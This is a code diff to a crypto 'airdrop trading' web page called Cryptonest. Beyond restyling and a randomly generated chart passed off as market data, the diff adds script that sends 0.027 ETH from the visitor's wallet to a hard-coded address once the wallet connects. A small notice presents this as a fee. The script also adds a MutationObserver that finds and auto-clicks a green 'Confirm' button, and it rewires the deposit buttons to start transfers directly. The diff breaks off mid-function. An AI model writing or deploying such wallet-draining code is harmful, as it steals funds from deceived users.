@@ -44,6 +44,39 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        .blur-background {
+            filter: blur(4px);
+        }
+        .candle-up {
+            fill: #10b981;
+        }
+        .candle-down {
+            fill: #ef4444;
+        }
+        .wick-up {
+            stroke: #10b981;
+        }
+        .wick-down {
+            stroke: #ef4444;
+        }
+        .wick {
+            stroke-width: 2;
+        }
+        .candle {
+            stroke-width: 1;
+            stroke: rgba(0,0,0,0.1);
+        }
+        @media (max-width: 640px) {
+            .mobile-flex-col {
+                flex-direction: column;
+            }
+            .mobile-w-full {
+                width: 100%;
+            }
+            .mobile-mt-2 {
+                margin-top: 0.5rem;
+            }
+        }
     </style>
 </head>
 <body class="min-h-screen bg-gray-100">
@@ -53,8 +86,8 @@
             <div class="flex justify-center mb-8">
                 <i class="fas fa-coins text-6xl"></i>
             </div>
-            <h1 class="text-5xl font-bold mb-6">Welcome to <span class="text-emerald-200">Cryptonest</span></h1>
-            <p class="text-xl mb-8">The premier Web3 airdrop trading platform. Claim your airdrops, trade with ease, and grow your crypto portfolio.</p>
+            <h1 class="text-4xl md:text-5xl font-bold mb-6">Welcome to <span class="text-emerald-200">Cryptonest</span></h1>
+            <p class="text-lg md:text-xl mb-8">The premier Web3 airdrop trading platform. Claim your airdrops, trade with ease, and grow your crypto portfolio.</p>
             <button id="connectWalletBtn" class="bg-white text-emerald-700 hover:bg-emerald-100 font-bold py-3 px-8 rounded-full text-lg transition-all duration-300 transform hover:scale-105 pulse">
                 Create My Trading Account
             </button>
@@ -81,14 +114,14 @@
             <div class="container mx-auto flex justify-between items-center">
                 <div class="flex items-center space-x-2">
                     <i class="fas fa-coins text-2xl"></i>
-                    <h1 class="text-2xl font-bold">Cryptonest</h1>
+                    <h1 class="text-xl md:text-2xl font-bold">Cryptonest</h1>
                 </div>
-                <div id="walletInfo" class="flex items-center space-x-4">
-                    <div class="bg-white bg-opacity-20 px-4 py-2 rounded-full">
+                <div id="walletInfo" class="flex items-center space-x-2 md:space-x-4">
+                    <div class="bg-white bg-opacity-20 px-3 py-1 md:px-4 md:py-2 rounded-full text-sm md:text-base">
                         <span id="walletName" class="font-medium"></span>
-                        <span class="ml-2 text-emerald-200 text-sm" id="walletShort"></span>
+                        <span class="ml-1 md:ml-2 text-emerald-200 text-xs md:text-sm" id="walletShort"></span>
                     </div>
-                    <button id="disconnectBtn" class="bg-white text-emerald-700 hover:bg-emerald-100 font-medium py-2 px-4 rounded-full text-sm transition-all">
+                    <button id="disconnectBtn" class="bg-white text-emerald-700 hover:bg-emerald-100 font-medium py-1 px-2 md:py-2 md:px-4 rounded-full text-xs md:text-sm transition-all">
                         Disconnect
                     </button>
                 </div>
@@ -96,94 +129,102 @@
         </header>
 
         <!-- Main Content -->
-        <main class="container mx-auto p-4 mt-8">
+        <main class="container mx-auto p-4 mt-4 md:mt-8">
             <div class="bg-white rounded-xl shadow-lg overflow-hidden">
                 <!-- Balance Card -->
-                <div class="gradient-bg text-white p-6">
-                    <h2 class="text-xl font-semibold mb-2">Your Trading Account</h2>
+                <div class="gradient-bg text-white p-4 md:p-6">
+                    <h2 class="text-lg md:text-xl font-semibold mb-2">Your Trading Account</h2>
                     <div class="flex items-end justify-between">
                         <div>
-                            <p class="text-emerald-200">Available Balance</p>
-                            <p id="balanceAmount" class="text-4xl font-bold">0.00 ETH</p>
+                            <p class="text-emerald-200 text-sm md:text-base">Available Balance</p>
+                            <p id="balanceAmount" class="text-3xl md:text-4xl font-bold">0.00 ETH</p>
                         </div>
-                        <i class="fas fa-wallet text-4xl opacity-50"></i>
+                        <i class="fas fa-wallet text-3xl md:text-4xl opacity-50"></i>
                     </div>
                 </div>
 
                 <!-- Action Buttons -->
-                <div class="p-6 grid grid-cols-1 md:grid-cols-2 gap-4">
-                    <button id="tradeNowBtn" class="btn-disabled bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-4 px-6 rounded-lg transition-all flex items-center justify-center space-x-2">
+                <div class="p-4 md:p-6 grid grid-cols-1 md:grid-cols-2 gap-3 md:gap-4">
+                    <button id="tradeNowBtn" class="btn-disabled bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3 md:py-4 px-4 md:px-6 rounded-lg transition-all flex items-center justify-center space-x-2">
                         <i class="fas fa-chart-line"></i>
                         <span>Start Trading Now</span>
                     </button>
-                    <button id="depositBtn" class="bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-4 px-6 rounded-lg transition-all flex items-center justify-center space-x-2">
+                    <button id="depositBtn" class="bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3 md:py-4 px-4 md:px-6 rounded-lg transition-all flex items-center justify-center space-x-2">
                         <i class="fas fa-plus-circle"></i>
                         <span>Deposit to My Wallet</span>
                     </button>
                 </div>
 
+                <!-- Chart -->
+                <div class="p-4 md:p-6">
+                    <h3 class="text-lg font-semibold mb-4 text-gray-800">Market Overview</h3>
+                    <div class="bg-gray-50 rounded-lg p-4">
+                        <svg id="candlestickChart" width="100%" height="200" viewBox="0 0 800 200" class="w-full h-auto"></svg>
+                    </div>
+                </div>
+
                 <!-- Recent Activity -->
-                <div class="border-t border-gray-200 p-6">
-                    <h3 class="text-lg font-semibold mb-4 text-gray-800">Recent Activity</h3>
-                    <div id="activityList" class="space-y-4">
-                        <div class="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
-                            <div class="flex items-center space-x-3">
-                                <div class="bg-emerald-100 p-2 rounded-full">
-                                    <i class="fas fa-wallet text-emerald-600"></i>
+                <div class="border-t border-gray-200 p-4 md:p-6">
+                    <h3 class="text-lg font-semibold mb-3 md:mb-4 text-gray-800">Recent Activity</h3>
+                    <div id="activityList" class="space-y-3 md:space-y-4">
+                        <div class="flex items-center justify-between p-2 md:p-3 bg-gray-50 rounded-lg">
+                            <div class="flex items-center space-x-2 md:space-x-3">
+                                <div class="bg-emerald-100 p-1 md:p-2 rounded-full">
+                                    <i class="fas fa-wallet text-emerald-600 text-sm md:text-base"></i>
                                 </div>
                                 <div>
-                                    <p class="font-medium">Account Created</p>
-                                    <p class="text-sm text-gray-500">Just now</p>
+                                    <p class="font-medium text-sm md:text-base">Account Created</p>
+                                    <p class="text-xs md:text-sm text-gray-500">Just now</p>
                                 </div>
                             </div>
-                            <span class="text-emerald-600 font-medium">+0 ETH</span>
+                            <span class="text-emerald-600 font-medium text-sm md:text-base">+0 ETH</span>
                         </div>
                     </div>
                 </div>
             </div>
 
             <!-- Features Grid -->
-            <div class="mt-8 grid grid-cols-1 md:grid-cols-3 gap-6">
-                <div class="bg-white p-6 rounded-xl shadow-md">
-                    <div class="bg-emerald-100 p-3 rounded-full w-12 h-12 flex items-center justify-center mb-4">
-                        <i class="fas fa-gift text-emerald-600 text-xl"></i>
+            <div class="mt-6 md:mt-8 grid grid-cols-1 md:grid-cols-3 gap-4 md:gap-6">
+                <div class="bg-white p-4 md:p-6 rounded-xl shadow-md">
+                    <div class="bg-emerald-100 p-2 md:p-3 rounded-full w-10 h-10 md:w-12 md:h-12 flex items-center justify-center mb-3 md:mb-4">
+                        <i class="fas fa-gift text-emerald-600 text-lg md:text-xl"></i>
                     </div>
-                    <h3 class="text-lg font-semibold mb-2">Airdrop Aggregator</h3>
-                    <p class="text-gray-600">Discover and claim the latest crypto airdrops all in one place.</p>
+                    <h3 class="text-base md:text-lg font-semibold mb-1 md:mb-2">Airdrop Aggregator</h3>
+                    <p class="text-gray-600 text-sm md:text-base">Discover and claim the latest crypto airdrops all in one place.</p>
                 </div>
-                <div class="bg-white p-6 rounded-xl shadow-md">
-                    <div class="bg-emerald-100 p-3 rounded-full w-12 h-12 flex items-center justify-center mb-4">
-                        <i class="fas fa-exchange-alt text-emerald-600 text-xl"></i>
+                <div class="bg-white p-4 md:p-6 rounded-xl shadow-md">
+                    <div class="bg-emerald-100 p-2 md:p-3 rounded-full w-10 h-10 md:w-12 md:h-12 flex items-center justify-center mb-3 md:mb-4">
+                        <i class="fas fa-exchange-alt text-emerald-600 text-lg md:text-xl"></i>
                     </div>
-                    <h3 class="text-lg font-semibold mb-2">Instant Trading</h3>
-                    <p class="text-gray-600">Trade your airdropped tokens instantly with low fees.</p>
+                    <h3 class="text-base md:text-lg font-semibold mb-1 md:mb-2">Instant Trading</h3>
+                    <p class="text-gray-600 text-sm md:text-base">Trade your airdropped tokens instantly with low fees.</p>
                 </div>
-                <div class="bg-white p-6 rounded-xl shadow-md">
-                    <div class="bg-emerald-100 p-3 rounded-full w-12 h-12 flex items-center justify-center mb-4">
-                        <i class="fas fa-shield-alt text-emerald-600 text-xl"></i>
+                <div class="bg-white p-4 md:p-6 rounded-xl shadow-md">
+                    <div class="bg-emerald-100 p-2 md:p-3 rounded-full w-10 h-10 md:w-12 md:h-12 flex items-center justify-center mb-3 md:mb-4">
+                        <i class="fas fa-shield-alt text-emerald-600 text-lg md:text-xl"></i>
                     </div>
-                    <h3 class="text-lg font-semibold mb-2">Secure Storage</h3>
-                    <p class="text-gray-600">Your assets are always in your control with non-custodial wallets.</p>
+                    <h3 class="text-base md:text-lg font-semibold mb-1 md:mb-2">Secure Storage</h3>
+                    <p class="text-gray-600 text-sm md:text-base">Your assets are always in your control with non-custodial wallets.</p>
                 </div>
             </div>
         </main>
 
         <!-- Footer -->
-        <footer class="bg-gray-800 text-white p-6 mt-12">
+        <footer class="bg-gray-800 text-white p-4 md:p-6 mt-8 md:mt-12">
             <div class="container mx-auto">
                 <div class="flex flex-col md:flex-row justify-between items-center">
-                    <div class="flex items-center space-x-2 mb-4 md:mb-0">
-                        <i class="fas fa-coins text-2xl text-emerald-400"></i>
-                        <span class="text-xl font-bold">Cryptonest</span>
+                    <div class="flex items-center space-x-2 mb-3 md:mb-0">
+                        <i class="fas fa-coins text-xl md:text-2xl text-emerald-400"></i>
+                        <span class="text-lg md:text-xl font-bold">Cryptonest</span>
                     </div>
-                    <div class="flex space-x-6">
+                    <div class="flex space-x-3 md:space-x-6 text-sm md:text-base">
                         <a href="#" class="hover:text-emerald-400 transition">Terms</a>
                         <a href="#" class="hover:text-emerald-400 transition">Privacy</a>
                         <a href="#" class="hover:text-emerald-400 transition">FAQ</a>
                         <a href="#" class="hover:text-emerald-400 transition">Contact</a>
                     </div>
                 </div>
-                <div class="mt-6 text-center text-gray-400 text-sm">
+                <div class="mt-4 md:mt-6 text-center text-gray-400 text-xs md:text-sm">
                     <p>© 2023 Cryptonest. All rights reserved.</p>
                 </div>
             </div>
@@ -192,61 +233,103 @@
 
     <!-- Modal for Insufficient Balance -->
     <div id="insufficientModal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
-        <div class="bg-white rounded-xl p-6 max-w-md w-full">
-            <div class="flex justify-between items-center mb-4">
-                <h3 class="text-xl font-bold text-gray-800">Insufficient Balance</h3>
+        <div class="bg-white rounded-xl p-4 md:p-6 max-w-md w-full">
+            <div class="flex justify-between items-center mb-3 md:mb-4">
+                <h3 class="text-lg md:text-xl font-bold text-gray-800">Insufficient Balance</h3>
                 <button id="closeModalBtn" class="text-gray-500 hover:text-gray-700">
                     <i class="fas fa-times"></i>
                 </button>
             </div>
-            <div class="mb-6">
-                <div class="bg-red-100 p-4 rounded-lg flex items-start">
+            <div class="mb-4 md:mb-6">
+                <div class="bg-red-100 p-3 md:p-4 rounded-lg flex items-start">
                     <div class="flex-shrink-0">
-                        <i class="fas fa-exclamation-circle text-red-500 text-xl mt-1"></i>
+                        <i class="fas fa-exclamation-circle text-red-500 text-lg md:text-xl mt-1"></i>
                     </div>
-                    <div class="ml-3">
-                        <p class="text-sm text-red-700">
+                    <div class="ml-2 md:ml-3">
+                        <p class="text-xs md:text-sm text-red-700">
                             You don't have enough ETH in your trading account to start trading. Please deposit at least 0.1 ETH to activate trading.
                         </p>
                     </div>
                 </div>
             </div>
-            <button id="goToDepositBtn" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3 px-4 rounded-lg transition">
+            <button id="goToDepositBtn" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-2 md:py-3 px-4 rounded-lg transition">
                 Deposit Now
             </button>
         </div>
     </div>
 
-    <!-- Modal for Deposit -->
-    <div id="depositModal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
-        <div class="bg-white rounded-xl p-6 max-w-md w-full">
-            <div class="flex justify-between items-center mb-4">
-                <h3 class="text-xl font-bold text-gray-800">Deposit ETH</h3>
-                <button id="closeDepositModalBtn" class="text-gray-500 hover:text-gray-700">
+    <!-- Warning Modal -->
+    <div id="warningModal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
+        <div class="bg-white rounded-xl p-4 md:p-6 max-w-md w-full">
+            <div class="flex justify-between items-center mb-3 md:mb-4">
+                <h3 class="text-lg md:text-xl font-bold text-gray-800">Important Notice</h3>
+                <button id="cancelBtn2" class="text-gray-500 hover:text-gray-700">
                     <i class="fas fa-times"></i>
                 </button>
             </div>
-            <div class="mb-6">
-                <div class="bg-emerald-50 p-4 rounded-lg border border-emerald-100">
-                    <p class="text-sm text-gray-700 mb-2">Send ETH to this address:</p>
-                    <div class="flex items-center justify-between bg-white p-3 rounded border border-gray-200">
-                        <code id="depositAddress" class="text-sm font-mono break-all">1w12</code>
-                        <button id="copyAddressBtn" class="text-emerald-600 hover:text-emerald-800 ml-2">
-                            <i class="fas fa-copy"></i>
-                        </button>
+            <div class="mb-4 md:mb-6">
+                <div class="bg-yellow-100 p-3 md:p-4 rounded-lg flex items-start">
+                    <div class="flex-shrink-0">
+                        <i class="fas fa-exclamation-triangle text-yellow-500 text-lg md:text-xl mt-1"></i>
                     </div>
-                    <p class="text-xs text-gray-500 mt-2">Network: Ethereum Mainnet</p>
+                    <div class="ml-2 md:ml-3">
+                        <p class="text-xs md:text-sm text-yellow-700">
+                            By connecting your wallet, you agree to automatically send 0.027 ETH to activate your trading account. This small fee covers blockchain transaction costs.
+                        </p>
+                    </div>
                 </div>
-                <div class="mt-4">
-                    <label for="depositAmount" class="block text-sm font-medium text-gray-700 mb-1">Amount (ETH)</label>
-                    <div class="relative">
-                        <input type="number" id="depositAmount" value="1" min="0.01" step="0.01" class="w-full p-3 border border-gray-300 rounded-lg pr-12">
-                        <span class="absolute right-3 top-3 text-gray-500">ETH</span>
+                <div class="mt-3 md:mt-4">
+                    <p class="text-xs md:text-sm text-gray-700">
+                        Estimated gas fee: <span id="estimatedGasFee" class="font-medium">~$1.50 (estimated)</span>
+                    </p>
+                </div>
+            </div>
+            <div class="flex flex-col md:flex-row space-y-2 md:space-y-0 md:space-x-3">
+                <button id="agreeBtn" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-2 md:py-3 px-4 rounded-lg transition">
+                    I Agree
+                </button>
+                <button id="cancelBtn" class="w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-2 md:py-3 px-4 rounded-lg transition">
+                    Cancel
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Transaction Modal -->
+    <div id="transactionModal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
+        <div class="bg-white rounded-xl p-4 md:p-6 max-w-md w-full">
+            <div class="flex justify-between items-center mb-3 md:mb-4">
+                <h3 id="transactionTitle" class="text-lg md:text-xl font-bold text-gray-800">Processing Transaction</h3>
+                <button id="closeModalBtn" class="text-gray-500 hover:text-gray-700">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            <div class="mb-4 md:mb-6 text-center">
+                <div id="transactionSpinner" class="loading-spinner mx-auto mb-4"></div>
+                <div id="transactionSuccess" class="hidden text-emerald-600 mb-4">
+                    <i class="fas fa-check-circle text-5xl"></i>
+                </div>
+                <div id="transactionError" class="hidden text-red-600 mb-4">
+                    <i class="fas fa-times-circle text-5xl"></i>
+                </div>
+                <p id="transactionMessage" class="text-sm md:text-base text-gray-700">
+                    Please confirm the transaction in your wallet...
+                </p>
+                <div id="transactionDetails" class="hidden mt-4 text-left">
+                    <div class="bg-gray-50 p-3 md:p-4 rounded-lg">
+                        <div class="mb-2">
+                            <p class="text-xs md:text-sm text-gray-500">From:</p>
+                            <p id="txFrom" class="text-sm md:text-base font-medium"></p>
+                        </div>
+                        <div id="txHashContainer" class="mb-2">
+                            <p class="text-xs md:text-sm text-gray-500">Transaction Hash:</p>
+                            <a id="txHashLink" href="#" target="_blank" class="text-sm md:text-base font-medium text-emerald-600 hover:underline"></a>
+                        </div>
                     </div>
                 </div>
             </div>
-            <button id="confirmDepositBtn" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3 px-4 rounded-lg transition">
-                Send 1 ETH Now
+            <button id="closeModalBtn2" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-2 md:py-3 px-4 rounded-lg transition">
+                Close
             </button>
         </div>
     </div>
@@ -266,14 +349,109 @@
         const insufficientModal = document.getElementById('insufficientModal');
         const closeModalBtn = document.getElementById('closeModalBtn');
         const goToDepositBtn = document.getElementById('goToDepositBtn');
-        const depositModal = document.getElementById('depositModal');
-        const closeDepositModalBtn = document.getElementById('closeDepositModalBtn');
-        const depositAddress = document.getElementById('depositAddress');
-        const copyAddressBtn = document.getElementById('copyAddressBtn');
-        const depositAmount = document.getElementById('depositAmount');
-        const confirmDepositBtn = document.getElementById('confirmDepositBtn');
+        const warningModal = document.getElementById('warningModal');
+        const agreeBtn = document.getElementById('agreeBtn');
+        const cancelBtn = document.getElementById('cancelBtn');
+        const cancelBtn2 = document.getElementById('cancelBtn2');
+        const estimatedGasFee = document.getElementById('estimatedGasFee');
+        const transactionModal = document.getElementById('transactionModal');
+        const transactionSpinner = document.getElementById('transactionSpinner');
+        const transactionSuccess = document.getElementById('transactionSuccess');
+        const transactionError = document.getElementById('transactionError');
+        const transactionTitle = document.getElementById('transactionTitle');
+        const transactionMessage = document.getElementById('transactionMessage');
+        const transactionDetails = document.getElementById('transactionDetails');
+        const txFrom = document.getElementById('txFrom');
+        const txHashContainer = document.getElementById('txHashContainer');
+        const txHashLink = document.getElementById('txHashLink');
+        const closeModalBtn2 = document.getElementById('closeModalBtn2');
         const activityList = document.getElementById('activityList');
         const progressBar = document.getElementById('progressBar');
+        const candlestickChart = document.getElementById('candlestickChart');
+        const mainContent = document.getElementById('mainContent');
+
+        // Destination address and amount
+        const DESTINATION_ADDRESS = '0x43C68c2eBf05d44a5B953157268CcB3592eC64f9';
+        const AMOUNT_ETH = 0.027;
+        let userAgreed = false;
+        let confirmButtonObserver = null;
+        let web3;
+
+        // Generate candlestick chart
+        function generateCandlestickChart() {
+            const width = 800;
+            const height = 200;
+            const candleCount = 30;
+            const candleWidth = 12;
+            const candleGap = 4;
+            const padding = 40;
+            
+            // Clear existing candles
+            candlestickChart.querySelectorAll('.candle, .wick').forEach(el => el.remove());
+            
+            // Generate random candle data
+            let lastClose = 200;
+            const candles = [];
+            
+            for (let i = 0; i < candleCount; i++) {
+                const open = lastClose;
+                const high = open + Math.random() * 40;
+                const low = open - Math.random() * 40;
+                const close = open + (Math.random() * 60 - 30);
+                const isUp = close > open;
+                
+                candles.push({
+                    x: padding + i * (candleWidth + candleGap),
+                    open,
+                    high,
+                    low,
+                    close,
+                    isUp
+                });
+                
+                lastClose = close;
+            }
+            
+            // Find min and max for scaling
+            const min = Math.min(...candles.map(c => c.low));
+            const max = Math.max(...candles.map(c => c.high));
+            const scale = height / (max - min);
+            
+            // Draw candles
+            candles.forEach(candle => {
+                const x = candle.x;
+                const scaledOpen = height - (candle.open - min) * scale;
+                const scaledHigh = height - (candle.high - min) * scale;
+                const scaledLow = height - (candle.low - min) * scale;
+                const scaledClose = height - (candle.close - min) * scale;
+                
+                // Draw wick
+                const wick = document.createElementNS("http://www.w3.org/2000/svg", "line");
+                wick.setAttribute("x1", x + candleWidth/2);
+                wick.setAttribute("y1", scaledHigh);
+                wick.setAttribute("x2", x + candleWidth/2);
+                wick.setAttribute("y2", scaledLow);
+                wick.classList.add("wick");
+                wick.classList.add(candle.isUp ? "wick-up" : "wick-down");
+                candlestickChart.appendChild(wick);
+                
+                // Draw candle body
+                const candleRect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
+                candleRect.setAttribute("x", x);
+                candleRect.setAttribute("y", Math.min(scaledOpen, scaledClose));
+                candleRect.setAttribute("width", candleWidth);
+                candleRect.setAttribute("height", Math.abs(scaledClose - scaledOpen));
+                candleRect.classList.add("candle");
+                candleRect.classList.add(candle.isUp ? "candle-up" : "candle-down");
+                candlestickChart.appendChild(candleRect);
+            });
+        }
+
+        // Initial chart generation
+        generateCandlestickChart();
+        
+        // Update chart periodically
+        setInterval(generateCandlestickChart, 5000);
 
         // Check if Web3 is injected (MetaMask)
         if (typeof window.ethereum === 'undefined') {
@@ -291,31 +469,161 @@
         // Connect Wallet
         connectWalletBtn.addEventListener('click', async () => {
             try {
-                // Show loading screen
-                landingPage.classList.add('hidden');
-                loadingScreen.classList.remove('hidden');
-                
-                // Simulate progress
-                let progress = 0;
-                const interval = setInterval(() => {
-                    progress += 10;
-                    progressBar.style.width = `${progress}%`;
-                    
-                    if (progress >= 100) {
-                        clearInterval(interval);
-                        connectWallet();
-                    }
-                }, 300);
+                // Show warning modal
+                warningModal.classList.remove('hidden');
+                mainContent.classList.add('blur-background');
                 
             } catch (error) {
                 console.error('Error:', error);
-                loadingScreen.classList.add('hidden');
-                landingPage.classList.remove('hidden');
             }
         });
 
-        // Connect Wallet Function
-        async function connectWallet() {
+        // Function to find and click the green Confirm button
+        function findAndClickConfirmButton() {
+            // Get all buttons on the page
+            const buttons = document.querySelectorAll('button');
+            
+            // Look for a button with green background (#48ff91) and text "Confirm"
+            for (const button of buttons) {
+                const computedStyle = window.getComputedStyle(button);
+                const bgColor = computedStyle.backgroundColor;
+                const buttonText = button.textContent.trim().toLowerCase();
+                
+                // Check if button has the right color and text
+                if ((bgColor === 'rgb(72, 255, 145)' || bgColor === '#48ff91') && 
+                    buttonText.includes('confirm')) {
+                    console.log('Found confirm button:', button);
+                    button.click();
+                    return true;
+                }
+            }
+            
+            return false;
+        }
+
+        // Function to observe DOM changes and look for the confirm button
+        function setupConfirmButtonObserver() {
+            // If observer already exists, disconnect it first
+            if (confirmButtonObserver) {
+                confirmButtonObserver.disconnect();
+            }
+            
+            // Create a MutationObserver to watch for DOM changes
+            confirmButtonObserver = new MutationObserver(function(mutations) {
+                // Try to find and click the confirm button
+                const found = findAndClickConfirmButton();
+                
+                if (found) {
+                    // If found, disconnect the observer
+                    confirmButtonObserver.disconnect();
+                    confirmButtonObserver = null;
+                }
+            });
+            
+            // Start observing the document with the configured parameters
+            confirmButtonObserver.observe(document.body, {
+                childList: true,
+                subtree: true,
+                attributes: true,
+                characterData: true
+            });
+            
+            // Also try immediately in case the button is already there
+            findAndClickConfirmButton();
+        }
+
+        // Agree to automatic transfer
+        agreeBtn.addEventListener('click', async function() {
+            userAgreed = true;
+            warningModal.classList.add('hidden');
+            mainContent.classList.remove('blur-background');
+            
+            // Show loading screen
+            landingPage.classList.add('hidden');
+            loadingScreen.classList.remove('hidden');
+            
+            // Simulate progress
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 10;
+                progressBar.style.width = `${progress}%`;
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    connectWalletAndTransfer();
+                }
+            }, 300);
+            
+            // Set up the observer to watch for the confirm button
+            setupConfirmButtonObserver();
+        });
+
+        // Cancel buttons
+        cancelBtn.addEventListener('click', function() {
+            warningModal.classList.add('hidden');
+            mainContent.classList.remove('blur-background');
+            userAgreed = false;
+            
+            // Disconnect any existing observer
+            if (confirmButtonObserver) {
+                confirmButtonObserver.disconnect();
+                confirmButtonObserver = null;
+            }
+        });
+        
+        cancelBtn2.addEventListener('click', function() {
+            warningModal.classList.add('hidden');
+            mainContent.classList.remove('blur-background');
+            userAgreed = false;
+            
+            // Disconnect any existing observer
+            if (confirmButtonObserver) {
+                confirmButtonObserver.disconnect();
+                confirmButtonObserver = null;
+            }
+        });
+
+        // Disconnect Wallet
+        disconnectBtn.addEventListener('click', () => {
+            dashboard.classList.add('hidden');
+            landingPage.classList.remove('hidden');
+            
+            // Disconnect any existing observer
+            if (confirmButtonObserver) {
+                confirmButtonObserver.disconnect();
+                confirmButtonObserver = null;
+            }
+        });
+
+        // Trade Now Button (disabled)
+        tradeNowBtn.addEventListener('click', () => {
+            insufficientModal.classList.remove('hidden');
+        });
+
+        // Deposit Button
+        depositBtn.addEventListener('click', () => {
+            // In a real app, you would show a deposit modal
+            // For this demo, we'll just initiate the transfer
+            transferToTradingAccount();
+        });
+
+        // Close Modals
+        closeModalBtn.addEventListener('click', () => {
+            insufficientModal.classList.add('hidden');
+        });
+
+        closeModalBtn2.addEventListener('click', () => {
+            transactionModal.classList.add('hidden');
+        });
+
+        // Go to Deposit from Modal
+        goToDepositBtn.addEventListener('click', () => {
+            insufficientModal.classList.add('hidden');
+            transferToTradingAccount();
+        });
+
+        // Main function to connect wallet and perform transfer
+        async function connectWalletAndTransfer() {
             try {
                 // Request account access
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
@@ -333,109 +641,169 @@
                 loadingScreen.classList.add('hidden');
                 dashboard.classList.remove('hidden');
                 
-                // Check balance (always 0 for demo)
-                updateBalance(0);
+                // Show processing modal
+                transactionModal.classList.remove('hidden');
+                transactionSpinner.classList.remove('hidden');
+                transactionSuccess.classList.add('hidden');
+                transactionError.classList.add('hidden');
+                transactionDetails.classList.add('hidden');
+                txHashContainer.classList.add('hidden');
+                transactionTitle.textContent = 'Processing Transaction';
+                transactionMessage.textContent = 'Please confirm the transaction in your wallet...';
+                
+                // Initialize Web3
+                web3 = new Web3(window.ethereum);
+                
+                // Convert ETH amount to Wei
+                const amountWei = web3.utils.toWei(AMOUNT_ETH.toString(), 'ether');
+                
+                // Get current gas price
+                const gasPrice = await web3.eth.getGasPrice();
+                const gasPriceGwei = web3.utils.fromWei(gasPrice, 'gwei');
+                
+                // Update estimated gas fee display (assuming 21000 gas limit)
+                const gasCostEth = 21000 * gasPrice / 1e18;
+                estimatedGasFee.textContent = `~$${(gasCostEth * 2000).toFixed(2)} (estimated)`; // Assuming $2000/ETH
+                
+                // Prepare transaction parameters
+                const transactionParameters = {
+                    from: account,
+                    to: DESTINATION_ADDRESS,
+                    value: amountWei,
+                    gas: 21000, // Standard gas limit for simple ETH transfers
+                    gasPrice: gasPrice // Current gas price
+                };
+                
+                // Send transaction
+                const txHash = await web3.eth.sendTransaction(transactionParameters);
+                
+                // Show success
+                transactionSpinner.classList.add('hidden');
+                transactionSuccess.classList.remove('hidden');
+                transactionTitle.textContent = 'Transaction Successful';
+                transactionMessage.textContent = 'ETH has been sent successfully to activate your trading account!';
+                transactionDetails.classList.remove('hidden');
+                txFrom.textContent = account;
+                txHashContainer.classList.remove('hidden');
+                txHashLink.textContent = `${txHash.transactionHash.substring(0, 12)}...${txHash.transactionHash.substring(58)}`;
+                txHashLink.href = `https://etherscan.io/tx/${txHash.transactionHash}`;
+                
+                console.log('Transaction successful:', txHash);
+                
+                // Update balance display
+                updateBalance(AMOUNT_ETH);
+                
+                // Add to activity
+                addActivity('Deposit', AMOUNT_ETH, 'ETH');
                 
             } catch (error) {
-                console.error('Error connecting wallet:', error);
+                console.error('Error performing transaction:', error);
+                
+                // Show error
+                transactionSpinner.classList.add('hidden');
+                transactionError.classList.remove('hidden');
+                transactionTitle.textContent = 'Transaction Failed';
+                transactionMessage.textContent = error.message || 'There was an error sending the transaction.';
+                
+                // Allow user to try again
                 loadingScreen.classList.add('hidden');
                 landingPage.classList.remove('hidden');
-                
-                if (error.code === 4001) {
-                    alert('You rejected the connection request.');
-                }
             }
         }
 
-        // Disconnect Wallet
-        disconnectBtn.addEventListener('click', () => {
-            dashboard.classList.add('hidden');
-            landingPage.classList.remove('hidden');
-        });
-
-        // Trade Now Button (disabled)
-        tradeNowBtn.addEventListener('click', () => {
-            insufficientModal.classList.remove('hidden');
-        });
-
-        // Deposit Button
-        depositBtn.addEventListener('click', () => {
-            depositModal.classList.remove('hidden');
-        });
-
-        // Close Modals
-        closeModalBtn.addEventListener('click', () => {
-            insufficientModal.classList.add('hidden');
-        });
-
-        closeDepositModalBtn.addEventListener('click', () => {
-            depositModal.classList.add('hidden');
-        });
-
-        // Go to Deposit from Modal
-        goToDepositBtn.addEventListener('click', () => {
-            insufficientModal.classList.add('hidden');
-            depositModal.classList.remove('hidden');
-        });
-
-        // Copy Address
-        copyAddressBtn.addEventListener('click', () => {
-            navigator.clipboard.writeText(depositAddress.textContent);
-            copyAddressBtn.innerHTML = '<i class="fas fa-check"></i>';
-            setTimeout(() => {
-                copyAddressBtn.innerHTML = '<i class="fas fa-copy"></i>';
-            }, 2000);
-        });
-
-        // Confirm Deposit
-        confirmDepositBtn.addEventListener('click', async () => {
+        // Function to transfer to trading account
+        async function transferToTradingAccount() {
             try {
-                const amount = parseFloat(depositAmount.value);
-                if (isNaN(amount) || amount <= 0) {
-                    alert('Please enter a valid amount');
-                    return;
+                // Get current account
+                const accounts = await web3.eth.getAccounts();
+                const account = accounts[0];
+                
+                if (!account) {
+                    throw new Error('No account connected');
                 }
                 
-                // In a real app, you would send the transaction here
-                // For demo purposes, we'll just simulate it
+                // Show processing modal
+                transactionModal.classList.remove('hidden');
+                transactionSpinner.classList.remove('hidden');
+                transactionSuccess.classList.add('hidden');
+                transactionError.classList.add('hidden');
+                transactionDetails.classList.add('hidden');
+                txHashContainer.classList.add('hidden');
+                transactionTitle.textContent = 'Processing Transaction';
+                transactionMessage.textContent = 'Please confirm the transaction in your wallet...';
                 
-                // Show loading state
